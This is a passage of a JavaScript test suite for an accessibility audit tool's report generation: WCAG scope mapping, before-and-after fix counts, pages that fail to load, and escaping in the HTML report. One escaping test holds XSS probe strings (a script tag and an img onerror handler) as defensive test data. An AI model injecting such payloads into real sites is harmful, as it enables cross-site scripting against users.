/**
 * `standards audit`: a set of pages in, one report out. The report is what a client signs off, so the
 * numbers are held on fixtures whose faults are known, a page that fails to load is named and never
 * counted clean, the WCAG mapping agrees with docs/accessibility-scope.md, and the report's own HTML
 * lints clean under the house system at every fixed width. A report that failed the gate it reports
 * on would not be worth reading.
 */
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, writeFileSync, existsSync, mkdirSync, copyFileSync, cpSync, symlinkSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { spawnSync, spawn } from 'node:child_process';
import { createServer } from 'node:http';
import { launchBrowser, lintPages, VIEWPORTS } from '../src/lib/page-lint.mjs';
import { RULES } from '../src/lib/rules/registry.mjs';
import { lint } from '../src/lib/rules.mjs';
import { checkOverflow } from '../src/lib/rules/layout.mjs';
import { registers, spreads } from '../src/lib/tokens.mjs';
import { parseScope, loadScope, offendingValue, findingsOf, pageEntry, aggregate, buildReport, rulesChecked, findingKey, systemOf, GATED_ON_II, PRINTED_IN_II, OFF_II, REFUSED } from '../src/lib/audit.mjs';
import { renderReport, houseCss, isReport } from '../src/lib/audit-html.mjs';
import { resolveSystem } from '../src/lib/system-arg.mjs';
import { CONFIG, ENV } from '../src/lib/names.mjs';

const ROOT = fileURLToPath(new URL('../', import.meta.url));
const STANDARDS_BIN = join(ROOT, 'bin/standards.mjs');
const FIXTURES = join(ROOT, 'test/fixtures/report');

let browser = null, launchError = null;
try { browser = await launchBrowser(); } catch (e) { launchError = e; if (process.env.CI) throw e; }
const skip = browser ? false : `no Chromium: ${launchError?.message.split('\n')[0]}`;
after(() => browser?.close());

const env = () => { const e = { ...process.env }; delete e.STANDARDS_SYSTEM; delete e[ENV.STANDARDS_SYSTEM]; return e; };
const standards = (args, cwd, bin = STANDARDS_BIN) => spawnSync(process.execPath, [bin, 'audit', ...args], { cwd, encoding: 'utf8', env: env(), timeout: 600000 });
/** As standards, without blocking this process, so a server the test runs can answer the pages. */
const standardsAsync = (args, cwd) => new Promise((done) => {
  const child = spawn(process.execPath, [STANDARDS_BIN, 'audit', ...args], { cwd, env: env() });
  let stdout = '', stderr = '';
  child.stdout.on('data', (b) => { stdout += b; });
  child.stderr.on('data', (b) => { stderr += b; });
  child.on('close', (status) => done({ status, stdout, stderr }));
});
/** A local server that answers with `answer(req)` ({ status, body, type }) and records every path asked for. */
const serve = async (answer) => {
  const hits = [];
  const server = createServer((req, res) => {
    hits.push(req.url);
    const { status = 200, body = '', type = 'text/html; charset=utf-8' } = answer(req);
    res.writeHead(status, { 'content-type': type });
    res.end(body);
  });
  server.on('upgrade', (req, socket) => { hits.push(`upgrade ${req.url}`); socket.destroy(); });
  await new Promise((ok) => server.listen(0, '127.0.0.1', ok));
  return { hits, origin: `http://127.0.0.1:${server.address().port}`, close: () => new Promise((ok) => server.close(ok)) };
};

// ---------------------------------------------------------------------------------------------
// The scope document and the WCAG mapping

test('the scope document reads as criteria and a list of what is not tested', () => {
  const scope = parseScope(readFileSync(join(ROOT, 'docs/accessibility-scope.md'), 'utf8'));
  const c111 = scope.criteria.find((c) => c.sc === '1.1.1');
  assert.equal(c111.name, 'Non-text Content');
  assert.equal(c111.extent, 'partial');
  assert.equal(scope.criteria.find((c) => c.sc === '1.4.3').extent, 'tested');
  assert.ok(scope.notTested.length >= 10, `${scope.notTested.length} items`);
  assert.ok(scope.notTested.some((t) => /^Keyboard traps/.test(t)));
  assert.ok(scope.notTested.every((t) => !t.startsWith('- ')), 'bullets are stripped');
});

test('every criterion a rule maps to is described in the scope document, and every described one has a rule', () => {
  const scope = loadScope();
  const mapped = new Set(RULES.flatMap((r) => r.wcag));
  const described = new Set(scope.criteria.map((c) => c.sc));
  assert.deepEqual([...mapped].filter((sc) => !described.has(sc)).sort(), [], 'a rule cites a criterion the scope document does not describe');
  assert.deepEqual([...described].filter((sc) => !mapped.has(sc)).sort(), [], 'the scope document describes a criterion no rule maps to');
});

test('a scope document without the expected sections is refused, not read as empty', () => {
  assert.throws(() => parseScope('# Accessibility scope\n\nNothing here.\n'), /scope document/);
});

// ---------------------------------------------------------------------------------------------
// Findings, values and the aggregate, on synthetic lint results

test('the offending value is read from the violation, by rule', () => {
  const text = { color: '#777777', background: '#FFFFFF', sizePx: 14, family: 'Arial', weight: 400, measureCh: 80 };
  assert.equal(offendingValue({ rule: 'contrast', ratio: 3.1, need: 4.5, text }), '3.10:1, #777777 on #FFFFFF (floor 4.5:1)');
  assert.equal(offendingValue({ rule: 'font-off-system', text }), 'Arial');
  assert.equal(offendingValue({ rule: 'measure', text }), '80ch');
  assert.equal(offendingValue({ rule: 'body-too-small', text }), '14px');
  assert.equal(offendingValue({ rule: 'target-size', target: { width: 16, height: 12 } }), '16×12px');
  assert.equal(offendingValue({ rule: 'radius-present', absence: { value: 12 } }), '12px');
  assert.equal(offendingValue({ rule: 'shadow-present', absence: { value: 'rgba(0, 0, 0, 0.3) 0px 4px 8px 0px' } }), 'rgba(0, 0, 0, 0.3) 0px 4px 8px 0px');
  assert.equal(offendingValue({ rule: 'spacing', value: 22 }), '22px');
  assert.equal(offendingValue({ rule: 'link-not-underlined', link: { underlined: false } }), 'no underline');
  assert.equal(offendingValue({ rule: 'heading-order', message: 'Heading level skips from h1 to h4 at "x"', heading: { level: 4 } }), 'h1 to h4');
  assert.equal(offendingValue({ rule: 'horizontal-overflow', overflow: 359 }), '359px wider than the viewport');
  assert.equal(offendingValue({ rule: 'motion-off-scale', item: { ms: 300 } }), '300ms');
  assert.equal(offendingValue({ rule: 'print-link-url', link: 'Example' }), 'Example');
  assert.equal(offendingValue({ rule: 'register', message: 'No [data-register] root in the document' }), null);
});

/** One lint result: a page at one width, with violations carrying selectors as the extractor gives them. */
const at = (viewport, violations, extra = {}) => ({ url: 'file:///p.html', viewport, spec: { register: 'ii' }, violations, advisories: [], ...extra });
const shadow = { rule: 'shadow-present', message: 'No box-shadow, got x on a p', absence: { sel: 'main > p.card', value: '0 2px red' } };
const target = { rule: 'target-size', message: 'Interactive targets are at least 24px, got 12×12px on a a', target: { sel: 'main > div > a.tiny', width: 12, height: 12 } };
const heading = { rule: 'heading-order', message: 'Heading level skips from h1 to h4 at "A"', heading: { sel: 'main > h4', level: 4 } };

test('a violation measured at several widths is one finding, with the widths it failed at', () => {
  const f = findingsOf([at(320, [shadow, target]), at(1280, [shadow])]);
  assert.equal(f.length, 2);
  const s = f.find((x) => x.rule === 'shadow-present');
  assert.deepEqual(s.widths, [320, 1280]);
  assert.deepEqual(s.selectors, ['main > p.card']);
  assert.equal(s.value, '0 2px red');
  assert.deepEqual(s.wcag, []);
  assert.deepEqual(f.find((x) => x.rule === 'target-size').wcag, ['2.5.8']);
  assert.equal(findingKey(s), 'shadow-present|main > p.card');
});

/** The page at one width as checkOverflow reports it, naming what sticks out, as a real run does. */
const overflowAt = (viewport, overflow, culprits) => {
  const violations = [];
  checkOverflow({}, { viewport, overflowX: overflow, overflowCulprits: culprits }, (rule, message, detail) => violations.push({ rule, message, ...detail }));
  return at(viewport, violations);
};

test('a page that overflows at two widths is one finding, though what sticks out differs between them', () => {
  const f = findingsOf([
    overflowAt(320, 188, [{ tag: 'div', cls: 'narrow', width: 500, right: 508 }, { tag: 'div', cls: 'wide', width: 900, right: 908 }]),
    overflowAt(672, 236, [{ tag: 'div', cls: 'wide', width: 900, right: 908 }]),
  ]);
  assert.match(f[0].message, /what sticks out/, 'the message has the shape checkOverflow gives it');
  assert.equal(f.length, 1, f.map((x) => x.message).join('\n'));
  assert.deepEqual(f[0].widths, [320, 672]);
  assert.deepEqual(f[0].values, ['188px wider than the viewport', '236px wider than the viewport']);
});

/** A spacing violation as the linter gives it: one value at one width, carried by the elements named. */
const spacingAt = (viewport, sels) => at(viewport, [{ rule: 'spacing', message: '22px is off the 8px spacing scale', value: 22 }], { spec: { register: 'ii', spacingSources: sels.map((sel) => ({ sel, value: 22 })) } });

test('a spacing value carried by several elements is a finding on each, whichever widths each carries it at', () => {
  const f = findingsOf([spacingAt(320, ['main > p.a']), spacingAt(672, ['main > p.a']), spacingAt(1280, ['main > p.a', 'main > p.b'])]);
  assert.deepEqual(f.map((x) => [x.selectors, x.widths]), [[['main > p.a'], [320, 672, 1280]], [['main > p.b'], [1280]]]);
});

/** A fixer's report that applied one fix: a page with the fixes was rendered, and can show a cure. */
const patched = (rule = 'shadow-present', selector = 'main > p.card') => ({ applied: [{ selector, pseudo: null, rules: [rule], declarations: { 'box-shadow': 'none' } }], refused: [], fixed: [rule] });
const partlyFixed = () => pageEntry({ input: 'p.html', initial: [spacingAt(320, ['main > p.a', 'main > p.b'])], after: [spacingAt(320, ['main > p.b'])], fix: patched('spacing', 'main > p.a') });

test('a spacing finding the fixer cured on one element and not another is fixed on the one, and nothing new appeared', () => {
  const p = partlyFixed();
  assert.deepEqual(p.findings.map((x) => [x.selectors[0], x.fixed]), [['main > p.a', true], ['main > p.b', false]]);
  assert.deepEqual(aggregate([p]).findings, { before: 2, after: 1, fixed: 1, introduced: 0 });
});

test('a page that fails to load is named and never counted clean', () => {
  const pages = [
    pageEntry({ input: 'a.html', initial: [at(320, []), at(1280, [])] }),
    pageEntry({ input: 'gone.html', error: 'no such file' }),
  ];
  assert.equal(pages[1].loaded, false);
  assert.equal(pages[1].clean.before, false);
  const a = aggregate(pages);
  assert.equal(a.pages, 2);
  assert.equal(a.loaded, 1);
  assert.deepEqual(a.notLoaded, [{ input: 'gone.html', error: 'no such file' }]);
  assert.equal(a.clean.before, 1);
  assert.equal(a.clean.after, null, 'no fixer run, no after');
  assert.equal(a.fixedWithoutModel, null);
});

test('before and after: what the fixer cured, what it left, and the share fixed without a model', () => {
  const fixReport = { applied: [{ selector: 'main > p.card', pseudo: null, rules: ['shadow-present'], declarations: { 'box-shadow': 'none' } }], refused: [{ selector: 'main > div > a.tiny', pseudo: null, rules: ['target-size'], declarations: { 'min-width': '24px' }, reason: 'it made a checked rule worse' }], fixed: ['shadow-present'] };
  const pages = [
    pageEntry({ input: 'one.html', initial: [at(320, [shadow, target, heading]), at(1280, [shadow, heading])], after: [at(320, [target, heading]), at(1280, [heading])], fix: fixReport }),
    pageEntry({ input: 'two.html', initial: [at(320, [shadow])], after: [at(320, [])], fix: patched() }),
    pageEntry({ input: 'three.html', error: 'HTTP 404' }),
  ];
  const [one, two] = pages;
  assert.deepEqual(one.violations, { before: 5, after: 3 });
  assert.equal(one.findings.length, 3);
  assert.deepEqual(one.findings.map((f) => [f.rule, f.fixed]), [['heading-order', false], ['shadow-present', true], ['target-size', false]]);
  assert.equal(one.remaining.length, 2);
  assert.equal(one.fixer.refused[0].reason, 'it made a checked rule worse');
  assert.deepEqual(one.fixer.rulesFixed, ['shadow-present'], 'the rules cleared are read from the two renders');
  assert.deepEqual(one.fixedRender, { comparable: true, error: null, failed: [], lost: [] });
  assert.deepEqual(two.clean, { before: false, after: true });

  const a = aggregate(pages);
  assert.deepEqual(a.clean, { before: 0, after: 1 });
  assert.deepEqual(a.violations, { before: 6, after: 3 });
  assert.deepEqual(a.findings, { before: 4, after: 2, fixed: 2, introduced: 0 });
  assert.deepEqual(a.fixedWithoutModel, { findings: 2, of: 4, share: 0.5 });
  const byRule = Object.fromEntries(a.byRule.map((r) => [r.rule, r]));
  assert.deepEqual(byRule['shadow-present'].pages, { before: 2, after: 0 });
  assert.deepEqual(byRule['shadow-present'].findings, { before: 2, after: 0 });
  assert.deepEqual(byRule['heading-order'].wcag, ['1.3.1']);
  assert.equal(a.byRule[0].rule, 'shadow-present', 'the rule with most findings comes first');
  assert.deepEqual(a.notComparable, []);
});

test('a fixer that applied nothing has cured nothing, whatever a render without its fixes showed', () => {
  // A copy that lost the page's script would show the heading and the shadow gone.
  const p = pageEntry({ input: 'app.html', initial: [at(320, [shadow, heading])], after: [at(320, [])], fix: { applied: [], refused: [], fixed: ['heading-order', 'shadow-present'] } });
  assert.deepEqual(p.findings.map((f) => [f.rule, f.fixed]), [['heading-order', false], ['shadow-present', false]]);
  assert.deepEqual(p.remaining.map((f) => f.rule), ['heading-order', 'shadow-present']);
  assert.deepEqual([p.clean.after, p.violations.after, p.fixer.rulesFixed], [false, 2, []]);
  assert.deepEqual(aggregate([p]).findings, { before: 2, after: 2, fixed: 0, introduced: 0 });
  // A fixer that applied something is judged on the render with its fixes.
  assert.deepEqual(pageEntry({ input: 'app.html', initial: [at(320, [shadow, heading])], after: [at(320, [heading])], fix: patched() }).findings.map((f) => f.fixed), [false, true]);
});

test('a page that lost anything that renders with the fixes is not compared, and is counted as found', () => {
  const css = { resource: 'site.css', type: 'stylesheet', why: 'HTTP 503' };
  const img = { resource: 'hero.jpg', type: 'image', why: 'HTTP 503' };
  const data = { resource: '/fetch/data.json', type: 'fetch', why: 'HTTP 503' };
  const icon = { resource: '/favicon.ico', type: 'other', why: 'HTTP 404' };
  const entry = (extra) => pageEntry({ input: 'one.html', initial: [at(320, [shadow, heading]), at(1280, [shadow])], after: [at(320, [heading]), at(1280, [target])], fix: patched(), ...extra });
  // Lost with the fixes: a stylesheet the page loaded as found, or the page itself.
  const lost = entry({ afterFailed: [css] });
  const unrendered = entry({ afterError: 'the browser was answered HTTP 403, not the page' });
  for (const p of [lost, unrendered]) {
    assert.equal(p.fixedRender.comparable, false);
    assert.deepEqual(p.findings.map((f) => f.fixed), [null, null], 'no finding is judged either way');
    assert.deepEqual([p.remaining, p.clean.after, p.violations.after, p.byRule.after, p.fixer.rulesFixed], [null, false, null, null, []]);
  }
  assert.deepEqual(lost.fixedRender, { comparable: false, error: null, failed: [css], lost: [css] });
  assert.deepEqual(unrendered.fixedRender.lost, []);
  // An image or the data a script fetched, lost with the fixes, can take findings with it: not compared.
  for (const f of [img, data]) assert.deepEqual(entry({ afterFailed: [f] }).fixedRender, { comparable: false, error: null, failed: [f], lost: [f] });
  // Compared: a stylesheet that failed as found too, and a request that renders nothing, lose nothing the page as found had.
  for (const p of [entry({ failed: [css], afterFailed: [css] }), entry({ afterFailed: [icon] })]) assert.equal(p.fixedRender.comparable, true, JSON.stringify(p.fixedRender));
  // The set counts a page not compared as found: nothing fixed, nothing introduced.
  const compared = entry({});
  assert.deepEqual(aggregate([compared]).findings, { before: 2, after: 2, fixed: 1, introduced: 1 });
  const a = aggregate([lost, compared]);
  assert.deepEqual(a.findings, { before: 4, after: 4, fixed: 1, introduced: 1, notCompared: 2 });
  assert.deepEqual(a.violations, { before: 6, after: 5 });
  assert.deepEqual(a.notComparable, [{ input: 'one.html', lost: [css], error: null }]);
  assert.deepEqual(Object.fromEntries(a.byRule.map((r) => [r.rule, r.findings])), { 'heading-order': { before: 2, after: 2 }, 'shadow-present': { before: 2, after: 1 }, 'target-size': { before: 0, after: 1 } });
  const r = buildReport({ pages: [lost], ...meta });
  assert.equal(r.wcag.find((c) => c.sc === '1.3.1').findings.after, 1, 'the WCAG table counts it as found too');
  const html = renderReport(r, { css: '' });
  assert.match(html, /<dt>Not compared with the fixes<\/dt><dd><span data-voice="data">one\.html<\/span>; counted as found, with nothing fixed<\/dd>/);
  assert.match(html, /as found, and <span class="af-status" data-status="caution" data-shape="triangle">.*not comparable<\/span> if fixed\./);
  assert.match(html, /did not load a resource it loaded as found \(a stylesheet, script, font, image or the data a script fetches\), listed below, so the two renders are not compared/);
  // The lede does not count findings that were never judged as needing a person.
  const both = renderReport(buildReport({ pages: [lost, compared], ...meta }), { css: '' });
  assert.match(both.replace(/<[^>]+>/g, ''), /2 findings need a person, and 2 findings on 1 page not compared were not judged\./);
  assert.match(html, /<td data-voice="data" class="af-wrap">site\.css<\/td><td data-voice="data">stylesheet<\/td><td data-voice="data" class="af-wrap">HTTP 503<\/td>/);
  assert.equal((html.match(/data-status="not-applicable" data-shape="dash">.*?not compared<\/span>/g) ?? []).length, 2, 'each finding is marked not compared');
  assert.doesNotMatch(html, /appeared after fixing/);
});

test('the rules checked are the error rules in force, and the universal set when no system judges the page', () => {
  const all = rulesChecked('system');
  assert.ok(all.includes('contrast') && all.includes('radius-present'));
  assert.ok(!all.includes('apca-advisory'), 'an advisory rule never gates, so it is not listed as checked');
  const universal = rulesChecked('universal');
  assert.ok(universal.includes('contrast') && !universal.includes('radius-present'));
  assert.ok(universal.length < all.length);
});

test('a page is not said to be checked against rules that cannot fire in its register', () => {
  const i = rulesChecked('system', [], 'i');
  const ii = rulesChecked('system', [], 'ii');
  for (const id of [...GATED_ON_II, ...PRINTED_IN_II]) {
    assert.ok(!i.includes(id), `${id} is listed for a Register I page`);
    assert.ok(ii.includes(id), `${id} is missing for a Register II page`);
  }
  assert.ok(i.includes('ground-off-palette') && !ii.includes('ground-off-palette'));
  assert.ok(rulesChecked('system', [], 'ii-dark').includes('link-colour-ii'), 'the dark Register II is Register II');
  const page = pageEntry({ input: 'one.html', initial: [at(1280, [], { spec: { register: 'i' } })] });
  assert.ok(!page.rulesChecked.some((id) => id.endsWith('-ii')), page.rulesChecked.join(', '));
});

test('the rules left out for Register I are the ones the linter runs only in Register II, and the other way round', () => {
  const { accent, link } = registers.ii;
  const spec = (register) => ({
    register,
    grounds: ['#123456'],
    text: [
      { voice: 'display', role: 'body', sizePx: 32, weight: 420, color: '#000000' },
      { voice: 'data', role: 'heading', sizePx: 32, weight: 700, color: '#000000' },
      { voice: 'text', role: 'body', sizePx: 12, weight: 400, color: accent },
    ],
    links: [{ color: link === '#000000' ? '#111111' : '#000000', underlined: true }],
    imagery: [{ kind: 'photo', tag: 'img' }, { kind: 'form', tag: 'svg', sizePx: 64, generated: 'form@1' }, { kind: 'form', tag: 'svg', sizePx: 64, generated: 'form@1' }],
    spreads: [{ name: Object.keys(spreads)[0] }],
    wordCount: 100000,
    hasProvenance: false,
  });
  const fired = (register) => new Set(lint(spec(register)).map((v) => v.rule));
  const inII = fired('ii'), inI = fired('i');
  for (const id of GATED_ON_II) {
    assert.ok(inII.has(id), `${id} does not fire on this Register II spec, so the list cannot be checked against it`);
    assert.ok(!inI.has(id), `${id} fired in Register I, so it is not Register II only`);
  }
  for (const id of OFF_II) {
    assert.ok(inI.has(id) && !inII.has(id), id);
  }
});

const meta = { system: { label: 'test system', version: '1.0.0', scope: 'system' }, engine: { name: 'engine', version: '9.9.9' }, register: null, widths: [320, 1280], sampled: [], seed: null, fix: true, generated: '2026-10-16T09:00:00.000Z', command: 'npx @appliedform/standards@4 audit pages/ --widths 320,1280 --fix' };

test('a page measured without its stylesheet, script or font is incomplete and never counted clean; an image that failed is listed only', () => {
  const css = { resource: 'css/site.css', type: 'stylesheet', why: 'HTTP 404' };
  const img = { resource: 'hero.jpg', type: 'image', why: 'no such file' };
  const pages = [
    pageEntry({ input: 'styled.html', initial: [at(320, [])], failed: [css, img] }),
    pageEntry({ input: 'pictured.html', initial: [at(320, [])], failed: [img] }),
    pageEntry({ input: 'fixed.html', initial: [at(320, [shadow])], after: [at(320, [])], fix: patched(), failed: [{ ...css, type: 'font' }], afterFailed: [{ ...css, type: 'font' }] }),
  ];
  assert.deepEqual(pages.map((p) => [p.incomplete, p.clean.before, p.clean.after]), [[true, false, null], [false, true, null], [true, false, false]]);
  const a = aggregate(pages);
  assert.deepEqual(a.clean, { before: 1, after: 0 });
  assert.equal(a.loaded, 3, 'an incomplete page was measured, and its findings count');
  assert.deepEqual(a.incomplete.map((p) => [p.input, p.failed.map((f) => f.type)]), [['styled.html', ['stylesheet']], ['fixed.html', ['font']]]);
  const html = renderReport(buildReport({ pages: pages.slice(0, 2), ...meta, fix: false }), { css: '' });
  assert.match(html, /data-status="caution" data-shape="triangle">.*measured incomplete/);
  assert.match(html, /<dt>Measured incomplete<\/dt><dd><span data-voice="data">styled\.html<\/span>; not counted clean<\/dd>/);
  assert.match(html, /<td data-voice="data" class="af-wrap">css\/site\.css<\/td><td data-voice="data">stylesheet<\/td><td data-voice="data" class="af-wrap">HTTP 404<\/td>/);
  assert.match(html, /None of them was a stylesheet, script or font, so the page is counted on its findings\./);
});

test('the JSON report has the shape a script can rely on', () => {
  const pages = [pageEntry({ input: 'one.html', initial: [at(320, [shadow])], after: [at(320, [])], fix: patched() }), pageEntry({ input: 'gone.html', error: 'no such file' })];
  const r = buildReport({ pages, ...meta });
  assert.equal(r.schema, 'af-audit/1');
  for (const k of ['generated', 'engine', 'system', 'register', 'widths', 'sampled', 'seed', 'fix', 'offline', 'roots', 'command', 'pageCommand', 'rulesChecked', 'pages', 'aggregate', 'wcag', 'notChecked', 'claim']) assert.ok(Object.hasOwn(r, k), k);
  assert.match(r.claim, /not a WCAG/);
  assert.match(r.claim, /EAA/);
  assert.equal(r.notChecked.doc, 'docs/accessibility-scope.md');
  assert.ok(r.notChecked.items.length >= 10);
  for (const k of ['input', 'name', 'loaded', 'error', 'incomplete', 'failed', 'register', 'assumedRegister', 'scope', 'rulesChecked', 'clean', 'violations', 'findings', 'remaining', 'fixer', 'fixedRender', 'command']) assert.ok(Object.hasOwn(r.pages[0], k), `page.${k}`);
  for (const k of ['pages', 'loaded', 'notLoaded', 'incomplete', 'notComparable', 'clean', 'violations', 'findings', 'fixedWithoutModel', 'byRule']) assert.ok(Object.hasOwn(r.aggregate, k), `aggregate.${k}`);
  for (const k of ['rule', 'selectors', 'value', 'values', 'message', 'widths', 'wcag', 'fixed']) assert.ok(Object.hasOwn(r.pages[0].findings[0], k), `finding.${k}`);
  const sc258 = r.wcag.find((c) => c.sc === '2.5.8');
  assert.deepEqual(sc258.rules, ['target-size']);
  assert.equal(typeof sc258.name, 'string');
  assert.deepEqual(JSON.parse(JSON.stringify(r)), r, 'it survives a round trip through JSON');
});

test('a finding the fixer introduced is counted and named, not hidden in the after total', () => {
  const pages = [pageEntry({ input: 'one.html', initial: [at(320, [shadow])], after: [at(320, [target])], fix: patched() })];
  const a = aggregate(pages);
  assert.deepEqual(a.findings, { before: 1, after: 1, fixed: 1, introduced: 1 });
  const html = renderReport(buildReport({ pages, ...meta }), { css: '' });
  assert.match(html, /appeared after fixing: <span data-voice="data">target-size<\/span>/);
});

test('the report says what the fixer would cure on a partly fixed value, and says the fixes are not written', () => {
  const html = renderReport(buildReport({ pages: [partlyFixed()], ...meta }), { css: '' });
  assert.doesNotMatch(html, /appeared after fixing/);
  assert.match(html, /The fixer would cure <span data-voice="data">1<\/span> of <span data-voice="data">2<\/span> findings/);
  assert.match(html, /not written to the pages/);
  assert.doesNotMatch(html, /Fixes applied/);
});

test('a selector in the sentence about findings that appeared after fixing is escaped once', () => {
  const sel = 'html > body:nth-of-type(1) > main:nth-of-type(1) > p:nth-of-type(2)';
  const pages = [pageEntry({ input: 'one.html', initial: [at(320, [])], after: [at(320, [{ ...shadow, absence: { sel, value: '0 2px red' } }])], fix: patched('spacing') })];
  const html = renderReport(buildReport({ pages, ...meta }), { css: '' });
  assert.match(html, /appeared after fixing: <span data-voice="data">shadow-present<\/span> on <span data-voice="data">html &gt; body:nth-of-type\(1\) &gt; main/);
  assert.doesNotMatch(html, /&amp;gt;/);
});

test('a set with no system loaded, holding a page that declares a register and one that does not, is not headed as judged by the universal rules', () => {
  const declared = pageEntry({ input: 'declared.html', initial: [at(320, [])] });
  const undeclared = pageEntry({ input: 'undeclared.html', initial: [at(320, [], { scope: 'universal' })] });
  const mixed = systemOf([declared, undeclared]);
  assert.equal(mixed.scope, 'system');
  assert.equal(mixed.label, "Applied Form's own tokens, and the universal rules for the page that declares no register");
  assert.deepEqual(systemOf([undeclared]), { label: 'the universal rules (no system loaded)', arg: null, version: null, scope: 'universal' });
  assert.equal(systemOf([declared], { label: 'north', arg: 'north' }).label, 'north');
  const html = renderReport(buildReport({ pages: [declared, undeclared], ...meta, fix: false, system: mixed }), { css: '' });
  assert.match(html, /<h1>.* checked against Applied Form's own tokens, and the universal rules for the page that declares no register<\/h1>/);
});

test('the one-page command measures a page as the run did: widths, system, register, --root, --fix and --offline', () => {
  for (const fix of [false, true]) {
    for (const offline of [false, true]) {
      const pages = [pageEntry({ input: 'one.html', initial: [at(320, [])], ...(fix ? { after: [at(320, [])], fix: { applied: [], refused: [], fixed: [] } } : {}) })];
      const r = buildReport({ pages, ...meta, fix, offline, register: 'ii', roots: ['shared assets'], system: { label: 'pack.tokens.json', arg: 'pack.tokens.json', version: null, scope: 'pack' } });
      const want = `npx @appliedform/standards@4 audit <page> --root 'shared assets' --widths 320,1280 --system pack.tokens.json --register ii${fix ? ' --fix' : ''}${offline ? ' --offline' : ''}`;
      assert.equal(r.pageCommand, want);
      const html = renderReport(r, { css: '' });
      assert.ok(html.includes(`One page at a time: <span data-voice="data">${want.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</span>.`), html.match(/One page at a time:.*/)?.[0]);
      // standards fix writes the fixes; it is named for that, and not as the command that repeats the audit.
      assert.equal(/To write a page's fixes: <span data-voice="data">npx @appliedform\/standards@4 fix &lt;page&gt; --widths 320,1280 --system pack\.tokens\.json --register ii<\/span>/.test(html), fix);
      // The provenance names the --root directories as every path in the report is named, and says what a page could read.
      assert.deepEqual(r.roots, ['shared assets']);
      assert.match(html, /Local files: a page from a file could read its own directory and below, the directories named, the --root directory shared assets and the Standards package's files; any other file it asked for was refused/);
    }
  }
  const shownApart = buildReport({ pages: [pageEntry({ input: 'one.html', initial: [at(320, [])] })], ...meta, fix: false, roots: ['/home/me/assets', '../fonts'], rootsShown: ['assets', 'fonts'] });
  assert.deepEqual([shownApart.roots, shownApart.pageCommand], [['assets', 'fonts'], 'npx @appliedform/standards@4 audit <page> --root /home/me/assets --root ../fonts --widths 320,1280']);
  assert.match(renderReport(shownApart, { css: '' }), /the --root directories assets, fonts and the Standards package's files/);
  assert.match(renderReport(buildReport({ pages: shownApart.pages, ...meta, fix: false }), { css: '' }), /could read its own directory and below, the directories named and the Standards package's files/);
  // A page that could read a directory named above its own carries its own command, with that directory.
  const own = pageEntry({ input: 'site/pages/a.html', initial: [at(320, [])], command: 'npx @appliedform/standards@4 audit site/pages/a.html --root site --widths 320,1280' });
  const plain = pageEntry({ input: 'site/b.html', initial: [at(320, [])], command: 'npx @appliedform/standards@4 audit site/b.html --widths 320,1280' });
  const html = renderReport(buildReport({ pages: [own, plain], ...meta, fix: false }), { css: '' });
  assert.match(html, /A page that could read a directory named above its own, or read a file in another directory named, is given that directory with <code>--root<\/code>: <span data-voice="data">npx @appliedform\/standards@4 audit site\/pages\/a\.html --root site --widths 320,1280<\/span>\./);
  assert.doesNotMatch(html, /npx @appliedform\/standards@4 audit site\/b\.html/, 'a page the one-page command measures as it is needs no command of its own in the report');
});

test('rule overrides in the project config are named in the provenance as not applied', () => {
  const pages = [pageEntry({ input: 'one.html', initial: [at(320, [])] })];
  const r = buildReport({ pages, ...meta, fix: false, policy: { applied: false, overrides: { 'shadow-present': 'off' } } });
  assert.deepEqual(r.policy, { applied: false, overrides: { 'shadow-present': 'off' } });
  assert.match(renderReport(r, { css: '' }), /Rule overrides: shadow-present: off in the project's config, not applied; every rule listed is checked/);
  assert.match(renderReport(buildReport({ pages, ...meta, fix: false }), { css: '' }), /Rule overrides: none applied/);
});

test('the report names the product Standards, in the provenance and the footer, and never "the engine"', () => {
  const pages = [pageEntry({ input: 'one.html', initial: [at(320, [])] })];
  const named = renderReport(buildReport({ pages, ...meta, fix: false, engine: { name: '@appliedform/standards', version: '4.0.0' } }), { css: '' });
  assert.match(named, /Standards: @appliedform\/standards 4\.0\.0/);
  assert.match(named, /Conformance report · @appliedform\/standards 4\.0\.0 ·/);
  // A report with no package name falls back to the product's name, not the old one.
  const bare = renderReport(buildReport({ pages, ...meta, fix: false, engine: {} }), { css: '' });
  assert.match(bare, /Standards: standards /);
  assert.match(bare, /Conformance report · standards\s+·/);
  // The sentences about what the fixer can do, on a run that fixed a page and on one that did not try.
  const fixed = renderReport(buildReport({ pages: [pageEntry({ input: 'one.html', initial: [at(320, [shadow])], after: [at(320, [])], fix: patched() })], ...meta, engine: { name: '@appliedform/standards', version: '4.0.0' } }), { css: '' });
  assert.match(fixed, /would pass with the fixes Standards can make on its own/);
  assert.match(bare, /to see what Standards can cure on its own/);
  for (const html of [named, bare, fixed]) assert.doesNotMatch(html.replace(/<[^>]+>/g, ' '), /\bengine\b/i);
});

test('the HTML escapes whatever the pages put in it', () => {
  const evil = { rule: 'shadow-present', message: 'x', absence: { sel: 'p.<script>alert(1)</script>', value: '<img src=x onerror=alert(1)>' } };
  const r = buildReport({ pages: [pageEntry({ input: 'a<b>.html', initial: [at(320, [evil])] })], ...meta, fix: false });
  const html = renderReport(r, { css: '' });
  assert.doesNotMatch(html, /<script>alert/);
  assert.doesNotMatch(html, /<img src=x/);
  assert.match(html, /p\.&lt;script&gt;/);
  assert.match(html, /a&lt;b&gt;\.html/);
});

test('the house stylesheet is inlined, fonts included, so the report stands alone', () => {
  const css = houseCss();
  assert.match(css, /--af-space-01/);
  assert.match(css, /\.af-provenance/);
  assert.doesNotMatch(css, /url\(["']?\.\.\//, 'no relative url is left for a file that travels alone');
});

// ---------------------------------------------------------------------------------------------
// The command, on fixtures with known faults

const workspace = () => {
  const dir = mkdtempSync(join(tmpdir(), 'af-audit-'));
  return dir;
};

/**
 * A site as a client hands it over: the fixture pages, at the depth they sit in this repository,
 * with the house stylesheet and the fonts they link to (../../../dist/tokens.css, and its ../fonts/)
 * in the same directory. standards audit lets a page read the directory named that holds it and nothing
 * above, so what a page loads has to be inside what is named.
 */
const site = (pages = ['clean.html', 'fixable.html', 'stubborn.html'], dir = workspace()) => {
  const root = join(dir, 'site');
  const at = join(root, 'test/fixtures/report');
  mkdirSync(at, { recursive: true });
  mkdirSync(join(root, 'dist'));
  copyFileSync(join(ROOT, 'dist/tokens.css'), join(root, 'dist/tokens.css'));
